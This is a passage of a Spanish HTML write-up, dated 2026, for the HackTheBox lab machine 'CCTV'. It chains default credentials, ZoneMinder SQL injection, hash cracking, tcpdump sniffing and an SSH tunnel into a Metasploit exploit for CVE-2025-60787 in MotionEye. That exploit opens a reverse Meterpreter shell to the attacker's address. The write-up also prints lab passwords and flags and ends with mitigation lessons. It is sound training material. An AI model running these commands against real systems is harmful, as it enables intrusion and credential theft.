+          <div class="code-body"><span class="comment"># Redirigir localhost:8765 de la víctima a nuestro localhost:8765</span>
+<span class="cmd">$ sshpass -p 'X1l9fx1ZjS7RZb' ssh \
+  -L 8765:127.0.0.1:8765 \
+  sa_mark@cctv.htb -N -f</span>
+
+<span class="ok">Túnel establecido: 127.0.0.1:8765 (atacante) → cctv.htb:8765</span>
+
+<span class="comment"># Verificar acceso</span>
+<span class="cmd">$ curl -s http://127.0.0.1:8765/ | grep -i "motioneye\|version"</span>
+<span class="ok">&lt;title&gt;cctv&lt;/title&gt;
+v=0.43.1b4</span>     <span class="comment">← MotionEye 0.43.1b4</span></div>
+        </div>
+
+        <div class="code-block">
+          <div class="code-label"><span>MotionEye</span> — Login con credencial de sa_mark</div>
+          <div class="code-body">URL:  http://127.0.0.1:8765/
+User: <span class="cred">admin</span>
+Pass: <span class="cred">X1l9fx1ZjS7RZb</span>    <span class="comment">← reutilización de la contraseña capturada</span>
+
+<span class="ok">Login exitoso — Panel de administración de MotionEye</span>
+<span class="ok">Versión detectada: 0.43.1b4</span></div>
+        </div>
+      </section>
+
+      <!-- 9. ROOT RCE -->
+      <section class="section" id="rootrce">
+        <div class="section-header">
+          <div class="section-number">9</div>
+          <h2>CVE-2025-60787 — RCE como Root</h2>
+        </div>
+
+        <h3>Análisis de la Vulnerabilidad</h3>
+        <div class="vuln-box">
+          <div class="title">&#128683; CVE-2025-60787 — MotionEye Config Injection RCE</div>
+          <p style="color:var(--text-dim);font-size:13.5px;line-height:1.7;">
+            MotionEye permite a administradores configurar nombres de archivos de imagen/video desde la UI web. Estos valores se escriben directamente en los archivos de configuración de <code style="font-family:monospace;color:var(--orange)">motion</code> sin sanitización de metacaracteres shell. El proceso <code style="font-family:monospace;color:var(--orange)">motion</code> ejecuta esos valores como parte de comandos shell, permitiendo inyección de comandos arbitrarios con los privilegios de <strong>root</strong>.
+          </p>
+          <div class="code-block" style="margin-top:12px;">
+            <div class="code-label"><span>Flujo</span> — del input al RCE</div>
+            <div class="code-body"><span class="highlight">usuario → campo image_file_name</span>
+       ↓ (sin sanitización)
+<span class="highlight">archivo config motion</span>
+       ↓ (ejecutado por motion como root)
+<span class="highlight">RCE con UID=0</span></div>
+          </div>
+        </div>
+
+        <h3>Explotación con Metasploit</h3>
+
+        <div class="code-block">
+          <div class="code-label"><span>msfconsole</span> — CVE-2025-60787</div>
+          <div class="code-body"><span class="cmd">msf6 &gt; use exploit/linux/http/motioneye_auth_rce_cve_2025_60787</span>
+<span class="cmd">msf6 &gt; set RHOSTS 127.0.0.1</span>
+<span class="cmd">msf6 &gt; set RPORT 8765</span>
+<span class="cmd">msf6 &gt; set PASSWORD X1l9fx1ZjS7RZb</span>
+<span class="cmd">msf6 &gt; set LHOST 10.10.15.13</span>     <span class="comment">← tun0</span>
+<span class="cmd">msf6 &gt; run -j</span>
+
+<span class="param">[*] Started reverse TCP handler on 10.10.15.13:4447</span>
+<span class="param">[*] Running automatic check...</span>
+<span class="ok">[+] The target appears to be vulnerable. Detected version 0.43.1b4</span>
+<span class="param">[*] Adding malicious camera...</span>
+<span class="ok">[+] Camera successfully added</span>
+<span class="param">[*] Setting up exploit...</span>
+<span class="ok">[+] Exploit setup complete</span>
+<span class="param">[*] Triggering exploit...</span>
+<span class="ok">[+] Exploit triggered, waiting for session...</span>
+<span class="param">[*] Sending stage (3090404 bytes) to 10.129.2.164</span>
+<span class="ok">[*] Meterpreter session 1 opened (10.10.15.13:4447 → 10.129.2.164:37168)</span>
+<span class="ok">[+] Camera removed successfully</span>
+
+<span class="cmd">msf6 &gt; sessions -c "cat /root/root.txt &amp;&amp; id" -i 1</span>
+
+<span class="flag">2af86531bbd25dcfae5201581f95335a</span>
+<span class="ok">uid=0(root) gid=0(root) groups=0(root)</span></div>
+        </div>
+
+        <div class="flag-box flag-root">
+          <span class="flag-emoji">&#128081;</span>
+          <div>
+            <div class="flag-label-txt">Root Flag — /root/root.txt</div>
+            <div class="flag-value">2af86531bbd25dcfae5201581f95335a</div>
+          </div>
+        </div>
+      </section>
+
+      <!-- 10. CADENA DE ATAQUE -->
+      <section class="section" id="cadena">
+        <div class="section-header">
+          <div class="section-number">10</div>
+          <h2>Cadena de Ataque Completa</h2>
+        </div>
+
+        <div class="timeline">
+          <div class="tl-item">
+            <div class="tl-dot"></div>
+            <div class="tl-phase">Fase 1 — Reconocimiento</div>
+            <div class="tl-title">Nmap + Virtual Host Discovery</div>
+            <div class="tl-desc">Puertos 22 y 80 abiertos. Apache redirige a <code style="font-family:monospace;color:var(--accent)">cctv.htb</code>. Se añade a /etc/hosts. La web expone ZoneMinder en /zm.</div>
+          </div>
+          <div class="tl-item">
+            <div class="tl-dot yellow"></div>
+            <div class="tl-phase">Fase 2 — Acceso Inicial Web</div>
+            <div class="tl-title">ZoneMinder — admin:admin (Default Creds)</div>
+            <div class="tl-desc">Login exitoso. Versión v1.37.63 identificada. Búsqueda de CVEs → CVE-2024-51482 (SQLi).</div>
+          </div>
+          <div class="tl-item">
+            <div class="tl-dot red"></div>
+            <div class="tl-phase">Fase 3 — Explotación Web</div>
+            <div class="tl-title">CVE-2024-51482 — SQLi en parámetro tid</div>
+            <div class="tl-desc">sqlmap con time-based blind injection extrae hashes bcrypt de la tabla Users. Hash de mark crackeado: opensesame.</div>
+          </div>
+          <div class="tl-item">
+            <div class="tl-dot blue"></div>
+            <div class="tl-phase">Fase 4 — Acceso SSH</div>
+            <div class="tl-title">SSH como mark — mark:opensesame</div>
+            <div class="tl-desc">Acceso a shell como mark. Enumeración revela tcpdump con cap_net_raw, log de sa_mark, y puerto 8765 interno.</div>
+          </div>
+          <div class="tl-item">
+            <div class="tl-dot orange"></div>
+            <div class="tl-phase">Fase 5 — Movimiento Lateral</div>
+            <div class="tl-title">Sniffing Docker — PASSWORD=X1l9fx1ZjS7RZb</div>
+            <div class="tl-desc">tcpdump captura credenciales de sa_mark en texto plano desde el tráfico Docker en el puerto 5000.</div>
+          </div>
+          <div class="tl-item">
+            <div class="tl-dot green"></div>
+            <div class="tl-phase">Fase 6 — User Flag</div>
+            <div class="tl-title">SSH como sa_mark → user.txt</div>
+            <div class="tl-desc">flag: c75820cd752bcc53f37fa247322e3f76</div>
+          </div>
+          <div class="tl-item">
+            <div class="tl-dot purple"></div>
+            <div class="tl-phase">Fase 7 — Pivoting</div>
+            <div class="tl-title">SSH Tunnel → MotionEye 0.43.1b4</div>
+            <div class="tl-desc">Port forwarding expone MotionEye. Login con admin/X1l9fx1ZjS7RZb (reutilización). CVE-2025-60787 identificado.</div>
+          </div>
+          <div class="tl-item">
+            <div class="tl-dot red"></div>
+            <div class="tl-phase">Fase 8 — Escalada de Privilegios</div>
+            <div class="tl-title">CVE-2025-60787 — MotionEye RCE → root</div>
+            <div class="tl-desc">Metasploit module: exploit/linux/http/motioneye_auth_rce_cve_2025_60787. Shell como uid=0(root). flag: 2af86531bbd25dcfae5201581f95335a</div>
+          </div>
+        </div>
+      </section>
+
+      <!-- 11. CREDENCIALES -->
+      <section class="section" id="creds">
+        <div class="section-header">
+          <div class="section-number">11</div>
+          <h2>Credenciales Recopiladas</h2>
+        </div>
+
+        <table class="data-table">
+          <thead>
+            <tr>
+              <th>Usuario</th>
+              <th>Contraseña / Hash</th>
+              <th>Servicio</th>
+              <th>Método</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><code>admin</code></td>
+              <td><code>admin</code></td>
+              <td>ZoneMinder</td>
+              <td><span class="badge badge-yellow">Default Creds</span></td>
+            </tr>
+            <tr>
+              <td><code>superadmin</code></td>
+              <td><code>$2y$10$cmytVW... (no crackeado)</code></td>
+              <td>ZoneMinder DB</td>
+              <td><span class="badge badge-red">SQLi</span></td>
+            </tr>
+            <tr>
+              <td><code>mark</code></td>
+              <td><code>opensesame</code></td>
+              <td>SSH + ZoneMinder DB</td>
+              <td><span class="badge badge-orange">SQLi + Hashcat</span></td>
+            </tr>
+            <tr>
+              <td><code>sa_mark</code></td>
+              <td><code>X1l9fx1ZjS7RZb</code></td>
+              <td>SSH + MotionEye</td>
+              <td><span class="badge badge-red">Network Sniff</span></td>
+            </tr>
+          </tbody>
+        </table>
+      </section>
+
+      <!-- 12. LECCIONES -->
+      <section class="section" id="lecciones">
+        <div class="section-header">
+          <div class="section-number">12</div>
+          <h2>Lecciones Aprendidas &amp; Mitigaciones</h2>
+        </div>
+
+        <div class="rec-grid">
+          <div class="rec-card">
+            <div class="rec-title">&#128273; Cambiar credenciales por defecto</div>
+            <div class="rec-body">admin:admin en ZoneMinder es el punto de entrada. Las plataformas de vigilancia nunca deben desplegarse con credenciales de fábrica. Forzar cambio en el primer inicio de sesión.</div>
+          </div>
+          <div class="rec-card">
+            <div class="rec-title">&#128202; Parchear inmediatamente (CVEs)</div>
+            <div class="rec-body">ZoneMinder v1.37.63 tiene CVE-2024-51482 conocida y pública. El patch simplemente cambia la query a prepared statement. No actualizar es deuda de seguridad directa.</div>
+          </div>
+          <div class="rec-card">
+            <div class="rec-title">&#128272; Limitar Linux Capabilities</div>
+            <div class="rec-body">cap_net_raw en tcpdump permite sniffing sin root. Solo otorgar capabilities estrictamente necesarias y a usuarios/procesos específicos, no globalmente.</div>
+          </div>
+          <div class="rec-card">
+            <div class="rec-title">&#128274; Cifrar tráfico interno</div>
+            <div class="rec-body">El servicio Flask transmite credenciales en texto plano. Todo tráfico entre microservicios/contenedores debe usar TLS, incluso en redes internas.</div>
+          </div>
+          <div class="rec-card">
+            <div class="rec-title">&#128275; No reutilizar contraseñas</div>
+            <div class="rec-body">La contraseña de sa_mark sirvió tanto para SSH como para MotionEye admin. Cada servicio debe tener credenciales únicas e independientes.</div>
+          </div>
+          <div class="rec-card">
+            <div class="rec-title">&#128203; Segmentar servicios internos</div>
+            <div class="rec-body">MotionEye no debería ejecutarse como root en el contenedor. Aplicar principio de mínimo privilegio: cada servicio con su propio usuario sin privilegios.</div>
+          </div>
+        </div>
+      </section>
+
+    </main>
+
+    <!-- SIDEBAR -->
+    <aside class="sidebar">
+
+      <div class="sidebar-card">
+        <h4>&#128270; Detalles de la Máquina</h4>
+        <div class="detail-row">
+          <span class="detail-label">Nombre</span>
+          <span class="detail-value">CCTV</span>
+        </div>
+        <div class="detail-row">
+          <span class="detail-label">Plataforma</span>
+          <span class="detail-value">HackTheBox</span>
+        </div>
+        <div class="detail-row">
+          <span class="detail-label">OS</span>
+          <span class="detail-value">Linux (Ubuntu 24.04)</span>
+        </div>
+        <div class="detail-row">
+          <span class="detail-label">Dificultad</span>
+          <span class="detail-value yellow">Medium</span>
+        </div>
+        <div class="detail-row">
+          <span class="detail-label">IP Objetivo</span>
+          <span class="detail-value" style="font-family:monospace;">10.129.2.164</span>
+        </div>
+        <div class="detail-row">
+          <span class="detail-label">User Flag</span>
+          <span class="detail-value green">&#10003; c75820cd...</span>
+        </div>
+        <div class="detail-row">
+          <span class="detail-label">Root Flag</span>
+          <span class="detail-value green">&#10003; 2af86531...</span>
+        </div>
+      </div>
+
+      <div class="sidebar-card">
+        <h4>&#128296; Herramientas Usadas</h4>
+        <div class="tool-list">
+          <div class="tool-item"><span class="tool-icon">&#128269;</span>nmap</div>
+          <div class="tool-item"><span class="tool-icon">&#127758;</span>curl</div>
+          <div class="tool-item"><span class="tool-icon">&#128200;</span>sqlmap</div>
+          <div class="tool-item"><span class="tool-icon">&#128272;</span>hashcat</div>
+          <div class="tool-item"><span class="tool-icon">&#128247;</span>tcpdump</div>
+          <div class="tool-item"><span class="tool-icon">&#128281;</span>sshpass</div>
+          <div class="tool-item"><span class="tool-icon">&#127987;</span>Metasploit</div>
+        </div>
+      </div>
+
+      <div class="sidebar-card">
+        <h4>&#128302; Habilidades Desarrolladas</h4>
+        <div class="skill-item">
+          <div class="skill-header"><span class="skill-name">Web App Exploitation</span><span class="skill-pct">95%</span></div>
+          <div class="skill-bar"><div class="skill-fill" style="width:95%"></div></div>
+        </div>
+        <div class="skill-item">
+          <div class="skill-header"><span class="skill-name">SQL Injection</span><span class="skill-pct">90%</span></div>
+          <div class="skill-bar"><div class="skill-fill" style="width:90%"></div></div>
+        </div>
+        <div class="skill-item">
+          <div class="skill-header"><span class="skill-name">Network Sniffing</span><span class="skill-pct">85%</span></div>
+          <div class="skill-bar"><div class="skill-fill" style="width:85%"></div></div>
+        </div>
+        <div class="skill-item">
+          <div class="skill-header"><span class="skill-name">SSH Tunneling</span><span class="skill-pct">80%</span></div>
+          <div class="skill-bar"><div class="skill-fill" style="width:80%"></div></div>
+        </div>
+        <div class="skill-item">
+          <div class="skill-header"><span class="skill-name">Linux Post-Exploitation</span><span class="skill-pct">85%</span></div>
+          <div class="skill-bar"><div class="skill-fill" style="width:85%"></div></div>
+        </div>
+      </div>
+
+      <div class="sidebar-card">
+        <h4>&#128204; Tabla de Contenidos</h4>
+        <ul class="toc-list">
+          <li><a href="#descripcion">1. Descripción</a></li>
+          <li><a href="#recon">2. Reconocimiento</a></li>
+          <li><a href="#zoneminder">3. ZoneMinder &amp; SQLi</a></li>
+          <li><a href="#hashcrack">4. Hash Cracking</a></li>
+          <li><a href="#enumeracion">5. Enumeración (mark)</a></li>
+          <li><a href="#sniffing">6. Network Sniffing</a></li>
+          <li><a href="#userflag">7. User Flag</a></li>
+          <li><a href="#motioneye">8. MotionEye Tunnel</a></li>
+          <li><a href="#rootrce">9. Root RCE</a></li>
+          <li><a href="#cadena">10. Attack Chain</a></li>
+          <li><a href="#creds">11. Credenciales</a></li>
+          <li><a href="#lecciones">12. Lecciones</a></li>
+        </ul>
+      </div>
+
+      <div class="sidebar-card">
+        <h4>&#128250; MITRE ATT&amp;CK</h4>
+        <div class="mitre-list">
+          <div class="mitre-item">
+            <span class="mitre-id">T1190</span>
+            <span class="mitre-name">Exploit Public-Facing Application (ZoneMinder SQLi)</span>
+          </div>
+          <div class="mitre-item">
+            <span class="mitre-id">T1110</span>
+            <span class="mitre-name">Brute Force / Default Credentials</span>
+          </div>
+          <div class="mitre-item">
+            <span class="mitre-id">T1040</span>
+            <span class="mitre-name">Network Sniffing (tcpdump cap_net_raw)</span>
+          </div>
+          <div class="mitre-item">
+            <span class="mitre-id">T1552</span>
+            <span class="mitre-name">Unsecured Credentials (plaintext en red)</span>
+          </div>
+          <div class="mitre-item">
+            <span class="mitre-id">T1572</span>
+            <span class="mitre-name">Protocol Tunneling (SSH port forwarding)</span>
+          </div>
+          <div class="mitre-item">
+            <span class="mitre-id">T1068</span>
+            <span class="mitre-name">Exploitation for Privilege Escalation (CVE-2025-60787)</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="sidebar-card">
+        <h4>&#128683; CVEs Explotados</h4>
+        <div class="mitre-list">
+          <div class="mitre-item">
+            <span class="mitre-id">CVE-2024-51482</span>
+            <span class="mitre-name">ZoneMinder SQL Injection (tid param) — CVSS 8.8</span>
+          </div>
+          <div class="mitre-item">
+            <span class="mitre-id">CVE-2025-60787</span>
+            <span class="mitre-name">MotionEye Authenticated RCE via config injection — CVSS 9.8</span>
+          </div>
+        </div>
+      </div>
+
+    </aside>
+  </div>
+</div>
+
+<footer>
+  <div class="footer-name">Yoandy Ramirez Delgado</div>
+  <div>HTB Machine: CCTV &nbsp;&#183;&nbsp; Pentesting Completo &nbsp;&#183;&nbsp; 2026-03-08</div>
+  <div style="margin-top:6px;font-size:11px;color:var(--border)">CVE-2024-51482 · CVE-2025-60787 · ZoneMinder · MotionEye · Linux</div>
+</footer>
+
+</body>
+</html>
